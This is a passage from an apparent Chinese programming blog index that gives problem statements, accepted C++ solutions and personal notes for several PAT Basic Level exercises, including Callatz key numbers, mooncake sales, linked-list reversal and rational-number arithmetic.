当我们验证卡拉兹猜想的时候，为了避免重复计算，可以记录下递推过程中遇到的每一个数。例如对 n=3 进行验证的时候，我们需要计算 3、5、8、4、2、1，则当我们对 n=5、8、4、2 进行验证的时候，就可以直接判定卡拉兹猜想的真伪，而不需要重复计算，因为这 4 个数已经在验证3的时候遇到过了，我们称 5、8、4、2 是被 3“覆盖”的数。我们称一个数列中的某个数 n 为“关键数”，如果 n 不能被数列中的其他数字所覆盖。 现在给定一系列待验证的数字，我们只需要验证其中的几个关键数，就可以不必再重复验证余下的数字。你的任务就是找出这些关键数字，并按从大到小的顺序输出它们。 输入格式： 每个测试输入包含 1 个测试用例，第 1 行给出一个正整数 K (&lt;100)，第 2 行给出 K 个互不相同的待验证的正整数 n (1&lt;n≤100)的值，数字间用空格隔开。 输出格式： 每个测试用例的输出占一行，按从大到小的顺序输出关键数字。数字间用 1 个空格隔开，但一行中最后一个数字后没有空格。 输入样例：1263 5 6 7 8 11 输出样例：17 6 通过代码（极致压行版）12345678910111213141516#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std;int arr[999999], brr[999999], n;int main() { cin &gt;&gt; n; for (int i = 0; i &lt; n &amp;&amp; cin &gt;&gt; brr[i]; i++) for (int t = brr[i]; t != 1;) if (t % 2 == 0) arr[t /= 2] = 1; else arr[t = (3 * t + 1) / 2] = 1; sort(brr, brr + n, greater&lt;int&gt;()); for (int i = 0, count = 0; i &lt; n; i++) if (!arr[brr[i]] &amp;&amp; count++ == 0) cout &lt;&lt; brr[i]; else if (!arr[brr[i]])cout &lt;&lt; &quot; &quot; &lt;&lt; brr[i]; return 0;} 通过代码123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std;int arr[999999];int main() { int n; cin &gt;&gt; n; int brr[n] = {0}; for (int i = 0; i &lt; n; i++) { cin &gt;&gt; brr[i]; for (int t = brr[i]; t != 1;) { if (t % 2 == 0) { arr[t/=2] = 1; } else { arr[t = (3*t + 1)/2] = 1; } } } sort(brr, brr+n, greater&lt;int&gt;()); for (int i = 0, count = 0; i &lt; n; i++) { if (!arr[brr[i]]) { if (count++ == 0) cout &lt;&lt; brr[i]; else cout &lt;&lt; &quot; &quot; &lt;&lt; brr[i]; } } return 0;} 思路 数字当引索的数组存是否存在的真假值","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1005-%E7%BB%A7%E7%BB%AD(3n+1)%E7%8C%9C%E6%83%B3(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1014","text":"题目 大侦探福尔摩斯接到一张奇怪的字条：我们约会吧！ 3485djDkxh4hhGE 2984akDfkkkkggEdsb s&amp;hgsfdk d&amp;Hyscvnm。大侦探很快就明白了，字条上奇怪的乱码实际上就是约会的时间星期四 14:04，因为前面两字符串中第 1 对相同的大写英文字母（大小写有区分）是第 4 个字母 D，代表星期四；第 2 对相同的字符是 E ，那是第 5 个英文字母，代表一天里的第 14 个钟头（于是一天的 0 点到 23 点由数字 0 到 9、以及大写字母 A 到 N 表示）；后面两字符串第 1 对相同的英文字母 s 出现在第 4 个位置（从 0 开始计数）上，代表第 4 分钟。现给定两对字符串，请帮助福尔摩斯解码得到约会的时间。 输入格式： 输入在 4 行中分别给出 4 个非空、不包含空格、且长度不超过 60 的字符串。 输出格式： 在一行中输出约会的时间，格式为 DAY HH:MM，其中 DAY 是某星期的 3 字符缩写，即 MON 表示星期一，TUE 表示星期二，WED 表示星期三，THU 表示星期四，FRI 表示星期五，SAT 表示星期六，SUN 表示星期日。题目输入保证每个测试存在唯一解。 输入样例：3485djDkxh4hhGE 2984akDfkkkkggEdsb s&amp;hgsfdk d&amp;Hyscvnm 输出样例：THU 14:04 通过代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;using namespace std;int main() { string clue[4]; int day, hour, minute; string week[7] = {&quot;MON&quot;, &quot;TUE&quot;, &quot;WED&quot;, &quot;THU&quot;, &quot;FRI&quot;, &quot;SAT&quot;, &quot;SUN&quot;}; for (int i = 0; i &lt; 4; i++) { cin &gt;&gt; clue[i]; } int count = -1; int y = 0; char c[2]; for (int i = 0; i &lt; min(clue[0].length(), clue[1].length()); i++) { if (count == -1 &amp;&amp; clue[0][i] == clue[1][i] &amp;&amp; (clue[0][i] &gt;= 'A' &amp;&amp; clue[0][i] &lt;= 'G')) { c[++count] = clue[0][i]; } if (count == 0 &amp;&amp; clue[0][i] == clue[1][i]) { if ((clue[0][i] &gt;= '0' &amp;&amp; clue[0][i] &lt;= '9') || (clue[0][i] &gt;= 'A' &amp;&amp; clue[0][i] &lt;= 'N')) { y++; } if (y == 2) { c[++count] = clue[0][i]; } } if (count == 1) { break; } } day = c[0] - 'A' + 1; if (c[1] &gt;= '0' &amp;&amp; c[1] &lt;= '9') { hour = c[1] - '0'; } else { hour = c[1] - 'A' + 10; } int pos = 0; for (int i = 0; i &lt; min(clue[2].length(), clue[3].length()); i++) { if (clue[2][i] == clue[3][i] &amp;&amp; ((clue[2][i] &gt;= 'a' &amp;&amp; clue[2][i] &lt;= 'z') || (clue[2][i] &gt;= 'A' &amp;&amp; clue[2][i] &lt;= 'Z'))) { pos = i; break; } } minute = pos; printf(&quot;%s %02d:%02d\\n&quot;, week[day - 1].data(), hour, minute); return 0;} 思路与注意 这道题实在是太咬文嚼字了！！ 第一个线索必须是’A’ 到 ‘G’ \b相同，因为一周只有7天 第二个线索必须是第二个相同的字符，而且必须是’0’-‘9’或’A’-‘N’的，因为一天只有24个小时（感觉题目自己和自己矛盾，题目不太严谨） 第二个线索必须在第一个线索的位置后面开始找（\b？？？\b反正我从题里面很难读出来） 反思与评价 很讨厌的一道题，纯属浪费人时间，做不出来也不纠结它也可以的。","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1014-%E7%A6%8F%E5%B0%94%E6%91%A9%E6%96%AF%E7%9A%84%E7%BA%A6%E4%BC%9A(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1015","text":"题目 宋代史学家司马光在《资治通鉴》中有一段著名的“德才论”：“是故才德全尽谓之圣人，才德兼亡谓之愚人，德胜才谓之君子，才胜德谓之小人。凡取人之术，苟不得圣人，君子而与之，与其得小人，不若得愚人。”现给出一批考生的德才分数，请根据司马光的理论给出录取排名。 输入格式： 输入第一行给出 3 个正整数，分别为：N（≤10^5），即考生总数；L（≥60），为录取最低分数线，即德分和才分均不低于 L 的考生才有资格被考虑录取；H（&lt;100），为优先录取线——德分和才分均不低于此线的被定义为“才德全尽”，此类考生按德才总分从高到低排序；才分不到但德分到线的一类考生属于“德胜才”，也按总分排序，但排在第一类考生之后；德才分均低于 H，但是德分不低于才分的考生属于“才德兼亡”但尚有“德胜才”者，按总分排序，但排在第二类考生之后；其他达到最低线 L 的考生也按总分排序，但排在第三类考生之后。 随后 N 行，每行给出一位考生的信息，包括：准考证号 德分 才分，其中准考证号为 8 位整数，德才分为区间 [0, 100] 内的整数。数字间以空格分隔。 输出格式： 输出第一行首先给出达到最低分数线的考生人数 M，随后 M 行，每行按照输入格式输出一位考生的信息，考生按输入中说明的规则从高到低排序。当某类考生中有多人总分相同时，按其德分降序排列；若德分也并列，则按准考证号的升序输出。 输入样例：14 60 80 10000001 64 90 10000002 90 60 10000011 85 80 10000003 85 80 10000004 80 85 10000005 82 77 10000006 83 76 10000007 90 78 10000008 75 79 10000009 59 90 10000010 88 45 10000012 80 100 10000013 90 99 10000014 66 60 输出样例：12 10000013 90 99 10000012 80 100 10000003 85 80 10000011 85 80 10000004 80 85 10000007 90 78 10000006 83 76 10000005 82 77 10000002 90 60 10000014 66 60 10000008 75 79 10000001 64 90 通过代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;struct stu { long id; int modest; int skill;};bool cmp(stu a, stu b) { if (a.modest + a.skill != b.modest + b.skill) return a.modest + a.skill &gt; b.modest + b.skill; else if (a.modest != b.modest) return a.modest &gt; b.modest; else return a.id &lt; b.id;}int main() { vector&lt;stu&gt; class1; vector&lt;stu&gt; class2; vector&lt;stu&gt; class3; vector&lt;stu&gt; class4; stu temp; int n, l, h; cin &gt;&gt; n &gt;&gt; l &gt;&gt; h; for (int i = 0; i &lt; n; i++) { cin &gt;&gt; temp.id &gt;&gt; temp.modest &gt;&gt; temp.skill; if (temp.modest &gt;= l &amp;&amp; temp.skill &gt;= l) { if (temp.modest &gt;= h &amp;&amp; temp.skill &gt;= h) class1.push_back(temp); else if (temp.modest &gt;= h &amp;&amp; temp.skill &lt; h) class2.push_back(temp); else if (temp.modest &lt; h &amp;&amp; temp.skill &lt; h &amp;&amp; temp.modest &gt;= temp.skill) class3.push_back(temp); else class4.push_back(temp); } } sort(class1.begin(), class1.end(), cmp); sort(class2.begin(), class2.end(), cmp); sort(class3.begin(), class3.end(), cmp); sort(class4.begin(), class4.end(), cmp); cout &lt;&lt; class1.size() + class2.size() + class3.size() + class4.size() &lt;&lt; endl; for (vector&lt;stu&gt;::iterator ite = class1.begin(); ite != class1.end(); ite++) {printf(&quot;%08ld %d %d\\n&quot;, (*ite).id, (*ite).modest, (*ite).skill);} for (vector&lt;stu&gt;::iterator ite = class2.begin(); ite != class2.end(); ite++) {printf(&quot;%08ld %d %d\\n&quot;, (*ite).id, (*ite).modest, (*ite).skill);} for (vector&lt;stu&gt;::iterator ite = class3.begin(); ite != class3.end(); ite++) {printf(&quot;%08ld %d %d\\n&quot;, (*ite).id, (*ite).modest, (*ite).skill);} for (vector&lt;stu&gt;::iterator ite = class4.begin(); ite != class4.end(); ite++) {printf(&quot;%08ld %d %d\\n&quot;, (*ite).id, (*ite).modest, (*ite).skill);} return 0;} 思路与注意 本质上还是统计数据，用\bstl会很方便。 \b必须及格的考生才能参与排序。 注意题真的很难读懂，长长的一大片。 大概分四类考生 第一类是两科都超过优胜线的。 第二类是德分过优胜线，才分及格的。 第三类是两科都及格，但都不到优胜线，且德分高于才分的。 第四类是两科过了及格线但不属于以上任何一种的考生 反思与评价 我觉得我这个代码完美，不需要反思","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1015-%E5%BE%B7%E6%89%8D%E8%AE%BA(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1018","text":"题目 大家应该都会玩“锤子剪刀布”的游戏：两人同时给出手势，胜负规则如图所示： 现给出两人的交锋记录，请统计双方的胜、平、负次数，并且给出双方分别出什么手势的胜算最大。 输入格式： 输入第 1 行给出正整数 N（≤10^5），即双方交锋的次数。随后 N 行，每行给出一次交锋的信息，即甲、乙双方同时给出的的手势。C 代表“锤子”、J 代表“剪刀”、B 代表“布”，第 1 个字母代表甲方，第 2 个代表乙方，中间有 1 个空格。 输出格式： 输出第 1、2 行分别给出甲、乙的胜、平、负次数，数字间以 1 个空格分隔。第 3 行给出两个字母，分别代表甲、乙获胜次数最多的手势，中间有 1 个空格。如果解不唯一，则输出按字母序最小的解。 输入样例：10 C J J B C B B B B C C C C B J B B C J J 输出样例：5 3 2 2 3 5 B B 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;iostream&gt;using namespace std;class Player { private: int win; int equal; int lose; int cw; int jw; int bw; char op; public: Player() { win = 0; lose = 0; equal = 0; cw = 0; jw = 0; bw = 0; op = 'n'; } void setOp(char a) { op = a; } static void game(Player &amp;a, Player &amp;b) { if (a.op == 'C') { if (b.op == 'C') { a.equal++; b.equal++; } else if (b.op == 'J') { a.win++; a.cw++; b.lose++; } else if (b.op == 'B') { a.lose++; b.win++; b.bw++; } } else if (a.op == 'J') { if (b.op == 'C') { a.lose++; b.win++; b.cw++; } else if (b.op == 'J') { a.equal++; b.equal++; } else if (b.op == 'B') { a.win++; a.jw++; b.lose++; } } else if (a.op == 'B') { if (b.op == 'C') { a.win++; b.lose++; a.bw++; } else if (b.op == 'J') { a.lose++; b.win++; b.jw++; } else if (b.op == 'B') { a.equal++; b.equal++; } } } void showCondition() { cout &lt;&lt; win &lt;&lt; &quot; &quot; &lt;&lt; equal &lt;&lt; &quot; &quot; &lt;&lt; lose &lt;&lt; endl; } char showMost() { if (jw &gt; cw) { if (jw &gt; bw) return 'J'; else return 'B'; } else if (jw == cw) { if (jw &gt; bw) return 'C'; else return 'B'; } else { if (cw &lt;= bw) return 'B'; else return 'C'; } }};int main(){ int n; cin &gt;&gt; n; cin.ignore(); Player a, b; for (int i = 0; i &lt; n; i++) { char aop, bop; cin &gt;&gt; aop; cin.ignore(); cin &gt;&gt; bop; cin.ignore(); a.setOp(aop); b.setOp(bop); Player::game(a, b); } a.showCondition(); b.showCondition(); cout &lt;&lt; a.showMost() &lt;&lt; &quot; &quot; &lt;&lt; b.showMost() &lt;&lt; endl; return 0;} 思路与注意 没什么好主意的，简单题 反思与评价 没什么好反思的 非要反思的话，压行是门技术活","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1018-%E9%94%A4%E5%AD%90%E5%89%AA%E5%88%80%E5%B8%83(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1020","text":"题目 月饼是中国人在中秋佳节时吃的一种传统食品，不同地区有许多不同风味的月饼。现给定所有种类月饼的库存量、总售价、以及市场的最大需求量，请你计算可以获得的最大收益是多少。 注意：销售时允许取出一部分库存。样例给出的情形是这样的：假如我们有 3 种月饼，其库存量分别为 18、15、10 万吨，总售价分别为 75、72、45 亿元。如果市场的最大需求量只有 20 万吨，那么我们最大收益策略应该是卖出全部 15 万吨第 2 种月饼、以及 5 万吨第 3 种月饼，获得 72 + 45/2 = 94.5（亿元）。 输入格式： 每个输入包含一个测试用例。每个测试用例先给出一个不超过 1000 的正整数 N 表示月饼的种类数、以及不超过 500（以万吨为单位）的正整数 D 表示市场最大需求量。随后一行给出 N 个正数表示每种月饼的库存量（以万吨为单位）；最后一行给出 N 个正数表示每种月饼的总售价（以亿元为单位）。数字间以空格分隔。 输出格式： 对每组测试用例，在一行中输出最大收益，以亿元为单位并精确到小数点后 2 位。 输入样例：1233 2018 15 1075 72 45 输出样例：194.50 通过代码1234567891011121314151617181920212223#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std;struct moonCake {double storage, money, price;};bool cmp(moonCake&amp; a, moonCake&amp; b) {return a.price &gt; b.price;}int main () { int n, m, i;//月饼种类，市场需求，循环变量（压行） cin &gt;&gt; n &gt;&gt; m; moonCake data[n]; for (int i = 0; i &lt; n; i++) cin &gt;&gt; data[i].storage;//输入 for (int i = 0; i &lt; n; i++) {//输入 cin &gt;&gt; data[i].money; data[i].price = data[i].money/data[i].storage; } sort(data, data + n, cmp); double sale = 0, temp; for (i = 0; i != n &amp;&amp; m; i++, m-= temp) {//每次循环，m减去卖出去的质量 temp = m &lt; data[i].storage ? m : data[i].storage; sale += temp/data[i].storage * data[i].money; } printf(&quot;%.2lf\\n&quot;, sale); return 0;} 思路与注意 贪心算法，在限制出售的总质量一定时，卖出的货物的平均单价越大，利润越高，即尽量多卖出存量/总售价大的月饼 输入数据，计算出单价（存量/总售价），根据单价降序排序 卖月饼，尽量多的买，如果存量小于等于m，则全部卖出，如果存量大于m，就卖出m，即卖出m与存量的最最小值 计算售价，加起来 输出 注意：把数据全改成double，也许是int会溢出 反思与评价 这题挺好 刚开始还想暴力求解，还TMD写不出来n个for循环嵌套（手动笑哭） 原来我学会贪心算法了啊，哈哈哈 压行压上瘾了","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1020-%E6%9C%88%E9%A5%BC%EF%BC%88%E8%B4%AA%E5%BF%83%EF%BC%89(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1025","text":"题目 给定一个常数 K 以及一个单链表 L，请编写程序将 L 中每 K 个结点反转。例如：给定 L 为 1→2→3→4→5→6，K 为 3，则输出应该为 3→2→1→6→5→4；如果 K 为 4，则输出应该为 4→3→2→1→5→6，即最后不到 K 个元素不反转。 输入格式： 每个输入包含 1 个测试用例。每个测试用例第 1 行给出第 1 个结点的地址、结点总个数正整数 N (≤10^5)、以及正整数 K (≤N)，即要求反转的子链结点的个数。结点的地址是 5 位非负整数，NULL 地址用 −1 表示。接下来有 N 行，每行格式为：Address Data Next其中 Address 是结点地址，Data 是该结点保存的整数数据，Next 是下一结点的地址。 输出格式： 对每个测试用例，顺序输出反转后的链表，其上每个结点占一行，格式与输入相同。 输入样例：00100 6 4 00000 4 99999 00100 1 12309 68237 6 -1 33218 3 00000 99999 5 68237 12309 2 33218 输出样例：00000 4 33218 33218 3 12309 12309 2 00100 00100 1 99999 99999 5 68237 68237 6 -1 通过代码1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;using namespace std;struct node { int add; int next; int data;};int main () { int first, num, k; scanf (&quot;%d%d%d&quot;, &amp;first, &amp;num, &amp;k); vector&lt;node&gt; v(100005); node temp; for (int i = 0; i &lt; num; i++) { scanf (&quot;%d%d%d&quot;, &amp;temp.add, &amp;temp.data, &amp;temp.next); v[temp.add] = temp; } int find = first; vector&lt;node&gt; x; while (find != -1) { x.push_back(v[find]); find = v[find].next; } num = (int)x.size(); for (int i = 0; i &lt; num/k; i++) { for (int j = (i+1)*k - 1,m = 0; m &lt; k/2; m++) { temp = x[j-m]; x[j-m] = x[j-k+1+m]; x[j-k+1+m] = temp; } } for (int i = 0; i &lt; num - 1; i++) { printf (&quot;%05d %d %05d\\n&quot;, x[i].add, x[i].data, x[i+1].add); } printf (&quot;%05d %d -1\\n&quot;, x[num - 1].add, x[num - 1].data); return 0;} 思路与注意 原来的思路是malloc创建数组，然后node结构体搞成指针的样子，搞成一个既是数组又是链表的东西，结果啊，越高越复杂。 搞一个vector数组，用于查表，把地址\b作为引索 然后根据\b首地址一直查找到结束，按顺序搞到一个vector里面 处理反转关系 输出 反思与评价 用之前的想法写不出来很\b不开心，不过stl真心牛逼！","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1025-%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1033","text":"题目 旧键盘上坏了几个键，于是在敲一段文字的时候，对应的字符就不会出现。现在给出应该输入的一段文字、以及坏掉的那些键，打出的结果文字会是怎样？ 输入格式： 输入在 2 行中分别给出坏掉的那些键、以及应该输入的文字。其中对应英文字母的坏键以大写给出；每段文字是不超过 10^5个字符的串。可用的字符包括字母 [a-z, A-Z]、数字 0-9、以及下划线 **_（代表空格）、,、.、-、+**（代表上档键）。题目保证第 2 行输入的文字串非空。注意：如果上档键坏掉了，那么大写的英文字母无法被打出。 输出格式： 在一行中输出能够被打出的结果文字。如果没有一个字符能被打出，则输出空行。 输入样例：7+IE. 7_This_is_a_test. 输出样例：_hs_s_a_tst 通过代码12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;int main () { string err; string origin; int chart[200] = {0}; char temp[100010] = {0}; cin.getline(temp, sizeof(temp)); err = temp; cin.getline(temp, sizeof(temp)); origin = temp; bool shift = false; for (int i = 0; i &lt; err.length(); i++) { chart[err[i]] = -1; if (err[i] == '+') {shift = true;} else { if (err[i] &gt;= 'a' &amp;&amp; err[i] &lt;= 'z'){ chart[err[i] - 'a' + 'A'] = -1; } if (err[i] &gt;= 'A' &amp;&amp; err[i] &lt;= 'Z') { chart[err[i] - 'A' + 'a'] = -1; } } } if (shift) { for (int i = 'A'; i &lt;= 'Z'; i++) chart[i] = -1; } for (int i = 0; i &lt; origin.length(); i++) { if (chart[origin[i]] != -1) cout &lt;&lt; origin[i]; } cout &lt;&lt; endl; return 0;} 思路与注意 这道题又是很坑的一道题 121. 输入样例后的'.'不知道是算shift键还是普通键2. 实际代码中只有'+'才是shift，其他都不是 要明确如果一个键坏掉，那么它对应的大小写都不能用了，如果shift键不能用了，所有的大写字母都不能用了 采用查表法，把不能用的键都变成-1，其他都是0 反思与评价 又是坑题，很讨厌","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1033-%E6%97%A7%E9%94%AE%E7%9B%98%E6%89%93%E5%AD%97(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1034","text":"题目 本题要求编写程序，计算 2 个有理数的和、差、积、商。 输入格式： 输入在一行中按照 a1/b1 a2/b2 的格式给出两个分数形式的有理数，其中分子和分母全是整型范围内的整数，负号只可能出现在分子前，分母不为 0。 输出格式： 分别在 4 行中按照 有理数1 运算符 有理数2 = 结果 的格式顺序输出 2 个有理数的和、差、积、商。注意输出的每个有理数必须是该有理数的最简形式 k a/b，其中 k 是整数部分，a/b 是最简分数部分；若为负数，则须加括号；若除法分母为 0，则输出 Inf。题目保证正确的输出中没有超过整型范围的整数。 输入样例 1：2/3 -4/2 输出样例 1：2/3 + (-2) = (-1 1/3) 2/3 - (-2) = 2 2/3 2/3 * (-2) = (-1 1/3) 2/3 / (-2) = (-1/3) 输入样例 2：5/3 0/6 输出样例 2：1 2/3 + 0 = 1 2/3 1 2/3 - 0 = 1 2/3 1 2/3 * 0 = 0 1 2/3 / 0 = Inf 通过代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;algorithm&gt;using namespace std;typedef long long ll;string toString (ll a) { string ans; while (a) { ans.append(1,(char)(a%10 + '0')); a/=10; } reverse(ans.begin(), ans.end()); return ans;}class Main {private: ll ans1,ans2, pos;public: Main(ll a, ll b) { pos = 1; ans1 = a; ans2 = b; if (a &lt; 0) { ans1 *= -1; pos*=-1; } if (b &lt; 0) { ans2 *= -1; pos*=-1; } } Main(Main&amp; ob) { ans1 = ob.ans1; ans2 = ob.ans2; pos = ob.pos; } void set(ll a, ll b) { pos = 1; ans1 = a; ans2 = b; if (a &lt; 0) { ans1 *= -1; pos*=-1; } if (b &lt; 0) { ans2 *= -1; pos*=-1; } } string toString() { string ans; if (ans1 == 0 &amp;&amp; ans2 != 0) { ans.append(&quot;0&quot;); return ans; } if (ans2 == 0) { ans.append(&quot;Inf&quot;); return ans; } getSmall(); if (pos == -1) { ans.append(&quot;(-&quot;); } if (ans2 != 1) { if (ans1 &lt; ans2) { ans.append(::toString(ans1)); ans.append(&quot;/&quot;); ans.append(::toString(ans2)); } else if (ans1 == ans2) { ans.append(&quot;1&quot;); } else { ll y = ans1 / ans2; ll ta1 = ans1; ta1 -= y * ans2; ans.append(::toString(y)); ans.append(&quot; &quot;); ans.append(::toString(ta1)); ans.append(&quot;/&quot;); ans.append(::toString(ans2)); } } else { ans.append(::toString(ans1)); } if (pos == -1) { ans.append(&quot;)&quot;); } return ans; } void getSmall() { ll ta = ans1, tb = ans2; while (tb != 0) { ll temp = ta % tb; ta = tb; tb = temp; } ans1 /= ta; ans2 /= ta; } static void add(Main* a, Main* b, Main* ans) { ll ans1 = a-&gt;ans1 * b-&gt;ans2 * a-&gt;pos + a-&gt;ans2 * b-&gt;ans1 * b-&gt;pos; ll ans2 = a-&gt;ans2 * b-&gt;ans2; ans-&gt;set(ans1, ans2); } static void sub(Main* a, Main* b, Main* ans) { ll ans1 = a-&gt;ans1 * b-&gt;ans2*a-&gt;pos - a-&gt;ans2 * b-&gt;ans1*b-&gt;pos; ll ans2 = a-&gt;ans2 * b-&gt;ans2; ans-&gt;set(ans1, ans2); } static void mul(Main* a, Main* b, Main* ans) { ll ans1 = a-&gt;pos * b-&gt;pos * a-&gt;ans1 * b-&gt;ans1; ll ans2 = a-&gt;ans2 * b-&gt;ans2; ans-&gt;set(ans1, ans2); } static void dev(Main* a, Main* b, Main* ans) { ll ans1 = a-&gt;pos * b-&gt;pos * a-&gt;ans1 * b-&gt;ans2; ll ans2 = a-&gt;ans2 * b-&gt;ans1; ans-&gt;set(ans1, ans2); }};int main() { ll a1,a2,b1,b2; scanf(&quot;%lld/%lld %lld/%lld&quot;, &amp;a1, &amp;a2, &amp;b1, &amp;b2); Main x(a1, a2); Main y(b1, b2); Main ans(0,0); Main::add(&amp;x, &amp;y, &amp;ans); cout &lt;&lt; x.toString() &lt;&lt; &quot; + &quot; &lt;&lt; y.toString() &lt;&lt; &quot; = &quot; &lt;&lt; ans.toString() &lt;&lt; endl; Main::sub(&amp;x, &amp;y, &amp;ans); cout &lt;&lt; x.toString() &lt;&lt; &quot; - &quot; &lt;&lt; y.toString() &lt;&lt; &quot; = &quot; &lt;&lt; ans.toString() &lt;&lt; endl; Main::mul(&amp;x, &amp;y, &amp;ans); cout &lt;&lt; x.toString() &lt;&lt; &quot; * &quot; &lt;&lt; y.toString() &lt;&lt; &quot; = &quot; &lt;&lt; ans.toString() &lt;&lt; endl; Main::dev(&amp;x, &amp;y, &amp;ans); cout &lt;&lt; x.toString() &lt;&lt; &quot; / &quot; &lt;&lt; y.toString() &lt;&lt; &quot; = &quot; &lt;&lt; ans.toString() &lt;&lt; endl; return 0;} 思路与注意 写一个对分数的处理类，分别记录分子，分母和符号 计算什么的直接算，等最后要输出之前求一下最大公倍数约分一下就好了，（原谅我不会约分的英文，只好写成getSmall了，hhh） 这道题题目上说输入和结构都在int范围，但是不保证中间过程也在int范围，所以要用long 注意第二个数为0时的要特判 反思与评价 这次把Java移植成C++，把以下问题都解决了，个人认为这题大概就是给C++设计的吧？12&gt;* 处理加和减的函数有点臃肿\b，有待提高&gt;* 这个代码在超时的边缘疯狂试探，有时候能全部通过，有时候会运行超时。好神奇，而且越压行，越超时。 在移植的时候，构造函数写成只有参数为负才会赋值，一直算不出来，折腾很久，以后移植的时候要小心。 移植过程中有很多内存泄漏的问题，后来也都改了。Java根本不用考虑内存的问题，以后移植的时候这一点也要注意。","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1034-%E6%9C%89%E7%90%86%E6%95%B0%E5%9B%9B%E5%88%99%E8%BF%90%E7%AE%97(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1040","text":"题目 字符串 APPAPT 中包含了两个单词 PAT，其中第一个 PAT 是第 2 位(P)，第 4 位(A)，第 6 位(T)；第二个 PAT 是第 3 位(P)，第 4 位(A)，第 6 位(T)。 现给定字符串，问一共可以形成多少个 PAT？ 输入格式： 输入只有一行，包含一个字符串，长度不超过105，只包含 P、A、T 三种字母。 输出格式： 在一行中输出给定字符串中包含多少个 PAT。由于结果可能比较大，只输出对 1000000007 取余数的结果。 输入样例：1APPAPT 输出样例：12 通过代码1234567891011121314#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() { char n[100100] = {0}; scanf(&quot;%s&quot;, n); int len = strlen(n); long long pat = 0, at = 0, t = 0; for (int i = len - 1; i &gt;= 0; i--) { if (n[i] == 'T') t++; if (n[i] == 'A') at = (at + t) % 1000000007; if (n[i] == 'P') pat = (pat + at) % 1000000007; } printf(&quot;%lld\\n&quot;, pat % 1000000007);} 思路与注意 题目限制150ms，应该只有O(N)的算法才可以 没思路 有几个PAT（25）看这里 反思与评价 这题挺好 这道题没思路，看题目要求150ms就知道这题用O(N)的方法才行，果断问度娘找了思路。有几个PAT（25） 可能是自己脑子不够用吧","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1040-%E6%9C%89%E5%87%A0%E4%B8%AAPAT(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1044","text":"题目 火星人是以 13 进制计数的： 地球人的 0 被火星人称为 tret。 地球人数字 1 到 12 的火星文分别为：jan, feb, mar, apr, may, jun, jly, aug, sep, oct, nov, dec。 火星人将进位以后的 12 个高位数字分别称为：tam, hel, maa, huh, tou, kes, hei, elo, syy, lok, mer, jou。 例如地球人的数字 29 翻译成火星文就是 hel mar；而火星文 elo nov 对应地球数字 115。为了方便交流，请你编写程序实现地球和火星数字之间的互译。 输入格式： 输入第一行给出一个正整数 N（&lt;100），随后 N 行，每行给出一个 [0, 169) 区间内的数字 —— 或者是地球文，或者是火星文。 输出格式： 对应输入的每一行，在一行中输出翻译后的另一种语言的数字。 输入样例：123454295elo novtam 输出样例：1234hel marmay11513 通过代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;#include &lt;ctype.h&gt;using namespace std;string num[2][13] = { {&quot;tret&quot;, &quot;jan&quot;, &quot;feb&quot;, &quot;mar&quot;, &quot;apr&quot;, &quot;may&quot;, &quot;jun&quot;, &quot;jly&quot;, &quot;aug&quot;, &quot;sep&quot;, &quot;oct&quot;, &quot;nov&quot;, &quot;dec&quot;}, {&quot;tret&quot;, &quot;tam&quot;, &quot;hel&quot;, &quot;maa&quot;, &quot;huh&quot;, &quot;tou&quot;, &quot;kes&quot;, &quot;hei&quot;, &quot;elo&quot;, &quot;syy&quot;, &quot;lok&quot;, &quot;mer&quot;, &quot;jou&quot;}};void C(string&amp; str) { int n = atoi(str.data()); string ans; int count = 0; for (int tn = n; tn; tn /= 13, count++); if (count == 1 || count == 0) ans = num[0][n]; else ans = num[1][n / 13] + ((n % 13 != 0) ? (&quot; &quot; + num[0][n % 13]) : &quot;&quot;); cout &lt;&lt; ans &lt;&lt; endl;}int D(string&amp; str) { if (str == &quot;tret&quot;) return 0; string a, b; a = str.substr(0, 3); if (str.length() &gt; 3) b = str.substr(4, str.length() - 3); if (b == &quot;&quot;) { for (int i = 0; i &lt; 13; i++) if (a == num[0][i]) return i; for (int i = 0; i &lt; 13; i++) if (a == num[1][i]) return i * 13; } else { int n = 0; for (int i = 0; i &lt; 13; i++) if (a == num[1][i]) n += i * 13; for (int i = 0; i &lt; 13; i++) if (b == num[0][i]) n += i; return n; }}int main() { int n; cin &gt;&gt; n; getchar(); for (int i = 0; i &lt; n; i++) { string temp; getline(cin, temp); if (!isalpha(temp[0])) C(temp); else cout &lt;&lt; D(temp) 